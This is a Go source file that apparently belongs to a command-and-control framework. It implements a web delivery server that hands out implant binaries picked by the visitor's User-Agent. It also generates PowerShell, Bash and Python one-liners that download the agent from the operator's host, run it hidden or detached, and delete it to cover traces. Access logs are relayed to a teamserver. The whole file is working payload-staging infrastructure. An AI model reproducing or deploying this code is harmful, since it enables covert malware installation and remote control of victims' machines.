package main

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"math/big"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// DeliveryConfig holds the web delivery service configuration.
type DeliveryConfig struct {
	HostBind          string   `json:"host_bind"`
	PortBind          int      `json:"port_bind"`
	DeliveryToken     string   `json:"delivery_token"`
	CallbackAddresses string   `json:"callback_addresses"`
	EncryptKey        string   `json:"encrypt_key"`

	UseSSL     bool   `json:"ssl"`
	ClientCert []byte `json:"client_cert"`
	ClientKey  []byte `json:"client_key"`
	CaCert     []byte `json:"ca_cert"`

	ReconnectTimeout string `json:"reconnect_timeout"`
	ReconnectCount   int    `json:"reconnect_count"`

	Platforms       []string          `json:"platforms"`
	DefaultPlatform string            `json:"default_platform"`
	ResponseHeaders map[string]string `json:"response_headers"`
	ServerHeaders   string            `json:"server_headers"`

	// Internal state
	Active bool `json:"active"`
}

// AccessLog represents a single access log entry.
type AccessLog struct {
	Timestamp string `json:"timestamp"`
	IP        string `json:"ip"`
	UserAgent string `json:"user_agent"`
	Platform  string `json:"platform"`
	Status    string `json:"status"`
	Size      int    `json:"size"`
}

// DeliveryServer manages the HTTP web delivery server.
type DeliveryServer struct {
	server  *http.Server
	config  DeliveryConfig
	builder *AgentBuilder
	logs    []AccessLog
	active  bool
}

// NewDeliveryServer creates a new DeliveryServer.
func NewDeliveryServer(config DeliveryConfig, builder *AgentBuilder) *DeliveryServer {
	return &DeliveryServer{
		config:  config,
		builder: builder,
		logs:    make([]AccessLog, 0),
		active:  false,
	}
}

// Start launches the HTTP delivery server.
func (s *DeliveryServer) Start() error {
	if s.active {
		return fmt.Errorf("delivery server already running")
	}

	if s.config.PortBind < 1 || s.config.PortBind > 65535 {
		return fmt.Errorf("invalid port: %d", s.config.PortBind)
	}

	gin.SetMode(gin.ReleaseMode)
	router := gin.New()

	// Apply custom response headers
	router.Use(func(c *gin.Context) {
		for header, value := range s.config.ResponseHeaders {
			c.Header(header, value)
		}
		c.Next()
	})

	// Register delivery routes
	router.GET("/dl/:token", s.handleDelivery)
	router.GET("/ps/:token", s.handlePowerShell)
	router.GET("/sh/:token", s.handleBash)
	router.GET("/py/:token", s.handlePython)

	address := fmt.Sprintf("%s:%d", s.config.HostBind, s.config.PortBind)
	s.server = &http.Server{
		Addr:    address,
		Handler: router,
	}

	if s.config.UseSSL {
		cert, err := tls.X509KeyPair(s.config.ClientCert, s.config.ClientKey)
		if err != nil {
			// Generate self-signed cert if none provided
			certData, keyData, genErr := generateSelfSignedCert(s.config.HostBind)
			if genErr != nil {
				return fmt.Errorf("failed to generate certificate: %v", genErr)
			}
			cert, err = tls.X509KeyPair(certData, keyData)
			if err != nil {
				return fmt.Errorf("failed to load certificate: %v", err)
			}
			s.config.ClientCert = certData
			s.config.ClientKey = keyData
		}

		s.server.TLSConfig = &tls.Config{
			Certificates: []tls.Certificate{cert},
			MinVersion:   tls.VersionTLS10,
			MaxVersion:   tls.VersionTLS13,
		}

		go func() {
			if err := s.server.ListenAndServeTLS("", ""); err != nil && err != http.ErrServerClosed {
				log.Printf("[WebDelivery] HTTPS server error: %v", err)
			}
		}()
		fmt.Printf("   Started Web Delivery HTTPS: %s:%d\n", s.config.HostBind, s.config.PortBind)
	} else {
		go func() {
			if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				log.Printf("[WebDelivery] HTTP server error: %v", err)
			}
		}()
		fmt.Printf("   Started Web Delivery HTTP: %s:%d\n", s.config.HostBind, s.config.PortBind)
	}

	s.active = true
	time.Sleep(500 * time.Millisecond)
	return nil
}

// Stop gracefully shuts down the delivery server.
func (s *DeliveryServer) Stop() error {
	if !s.active || s.server == nil {
		return nil
	}

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()

	err := s.server.Shutdown(ctx)
	s.active = false
	s.builder.ClearCache()
	return err
}

// IsActive returns whether the server is running.
func (s *DeliveryServer) IsActive() bool {
	return s.active
}

// GetLogs returns a copy of access logs.
func (s *DeliveryServer) GetLogs() []AccessLog {
	return append([]AccessLog{}, s.logs...)
}

// handleDelivery is the main delivery endpoint that serves agent binaries based on UA.
func (s *DeliveryServer) handleDelivery(c *gin.Context) {
	token := c.Param("token")
	if token == "" || token != s.config.DeliveryToken {
		c.AbortWithStatus(http.StatusNotFound)
		return
	}

	ua := c.Request.UserAgent()
	goos, goarch := ParseUserAgent(ua)

	// Get the cached binary for this platform
	data := s.builder.GetCached(goos, goarch)
	status := "delivered"
	size := 0

	if data == nil {
		// Try default platform as fallback
		parts := strings.Split(s.config.DefaultPlatform, "/")
		if len(parts) == 2 {
			data = s.builder.GetCached(parts[0], parts[1])
			if data != nil {
				goos = parts[0]
				goarch = parts[1]
			}
		}
	}

	if data == nil {
		status = "no_binary"
		s.addLog(c, ua, goos+"/"+goarch, status, 0)
		c.AbortWithStatus(http.StatusNotFound)
		return
	}

	size = len(data)

	// Determine filename and content type
	filename := "agent.bin"
	contentType := "application/octet-stream"
	if goos == "windows" {
		filename = "agent.exe"
	}

	c.Header("Content-Type", contentType)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filename))
	c.Header("Content-Length", fmt.Sprintf("%d", size))
	_, _ = c.Writer.Write(data)

	s.addLog(c, ua, goos+"/"+goarch, status, size)
}

// handlePowerShell returns a PowerShell one-liner to download and execute the agent.
func (s *DeliveryServer) handlePowerShell(c *gin.Context) {
	token := c.Param("token")
	if token == "" || token != s.config.DeliveryToken {
		c.AbortWithStatus(http.StatusNotFound)
		return
	}

	scheme := "http"
	if s.config.UseSSL {
		scheme = "https"
	}
	dlURL := fmt.Sprintf("%s://%s:%d/dl/%s", scheme, s.config.HostBind, s.config.PortBind, s.config.DeliveryToken)

	script := fmt.Sprintf(`$d=New-Object Net.WebClient;$p=[System.IO.Path]::GetTempPath()+'a.exe';$d.DownloadFile('%s',$p);Start-Process $p -WindowStyle Hidden;Remove-Item $p`, dlURL)

	c.Header("Content-Type", "text/plain")
	_, _ = c.Writer.Write([]byte(script))
}

// handleBash returns a Bash one-liner to download and execute the agent.
func (s *DeliveryServer) handleBash(c *gin.Context) {
	token := c.Param("token")
	if token == "" || token != s.config.DeliveryToken {
		c.AbortWithStatus(http.StatusNotFound)
		return
	}

	scheme := "http"
	if s.config.UseSSL {
		scheme = "https"
	}
	dlURL := fmt.Sprintf("%s://%s:%d/dl/%s", scheme, s.config.HostBind, s.config.PortBind, s.config.DeliveryToken)

	script := fmt.Sprintf(`curl -sSL '%s' -o /tmp/.a && chmod +x /tmp/.a && /tmp/.a & disown && rm -f /tmp/.a`, dlURL)

	c.Header("Content-Type", "text/plain")
	_, _ = c.Writer.Write([]byte(script))
}

// handlePython returns a Python one-liner to download and execute the agent.
func (s *DeliveryServer) handlePython(c *gin.Context) {
	token := c.Param("token")
	if token == "" || token != s.config.DeliveryToken {
		c.AbortWithStatus(http.StatusNotFound)
		return
	}

	scheme := "http"
	if s.config.UseSSL {
		scheme = "https"
	}
	dlURL := fmt.Sprintf("%s://%s:%d/dl/%s", scheme, s.config.HostBind, s.config.PortBind, s.config.DeliveryToken)

	script := fmt.Sprintf(`python3 -c "import urllib.request,os,subprocess;p='/tmp/.a';urllib.request.urlretrieve('%s',p);os.chmod(p,0o755);subprocess.Popen([p]);import time;time.sleep(1);os.remove(p)"`, dlURL)

	c.Header("Content-Type", "text/plain")
	_, _ = c.Writer.Write([]byte(script))
}

// addLog records an access log entry.
func (s *DeliveryServer) addLog(c *gin.Context, ua, platform, status string, size int) {
	ip := c.ClientIP()

	entry := AccessLog{
		Timestamp: time.Now().Format("2006-01-02 15:04:05"),
		IP:        ip,
		UserAgent: ua,
		Platform:  platform,
		Status:    status,
		Size:      size,
	}

	s.logs = append(s.logs, entry)

	// Keep only last 200 entries
	if len(s.logs) > 200 {
		s.logs = s.logs[len(s.logs)-200:]
	}

	// Notify client via teamserver
	if Ts != nil {
		logData, _ := json.Marshal(map[string]interface{}{
			"action": "access_log",
			"entry":  entry,
		})
		Ts.TsServiceSendDataAll("web_delivery", string(logData))
	}
}

// GetOneLiners returns the one-liner commands for all platforms.
func (s *DeliveryServer) GetOneLiners() map[string]string {
	scheme := "http"
	if s.config.UseSSL {
		scheme = "https"
	}
	dlURL := fmt.Sprintf("%s://%s:%d/dl/%s", scheme, s.config.HostBind, s.config.PortBind, s.config.DeliveryToken)

	return map[string]string{
		"powershell": fmt.Sprintf(`$d=New-Object Net.WebClient;$p=[System.IO.Path]::GetTempPath()+'a.exe';$d.DownloadFile('%s',$p);Start-Process $p -WindowStyle Hidden;Remove-Item $p`, dlURL),
		"bash":       fmt.Sprintf(`curl -sSL '%s' -o /tmp/.a && chmod +x /tmp/.a && /tmp/.a & disown && rm -f /tmp/.a`, dlURL),
		"python":     fmt.Sprintf(`python3 -c "import urllib.request,os,subprocess;p='/tmp/.a';urllib.request.urlretrieve('%s',p);os.chmod(p,0o755);subprocess.Popen([p]);import time;time.sleep(1);os.remove(p)"`, dlURL),
	}
}

// generateSelfSignedCert creates a self-signed TLS certificate.
func generateSelfSignedCert(host string) ([]byte, []byte, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to generate private key: %v", err)
	}

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to generate serial number: %v", err)
	}

	template := x509.Certificate{
		SerialNumber: serialNumber,
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	hostBind := strings.TrimSpace(host)
	if hostBind == "" || hostBind == "0.0.0.0" || hostBind == "::" {
		template.DNSNames = []string{"localhost"}
		template.IPAddresses = []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")}
	} else if ip := net.ParseIP(hostBind); ip != nil {
		template.IPAddresses = []net.IP{ip}
	} else {
		template.DNSNames = []string{hostBind}
	}

	certData, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to create certificate: %v", err)
	}

	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certData})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(privateKey)})

	return certPEM, keyPEM, nil
}
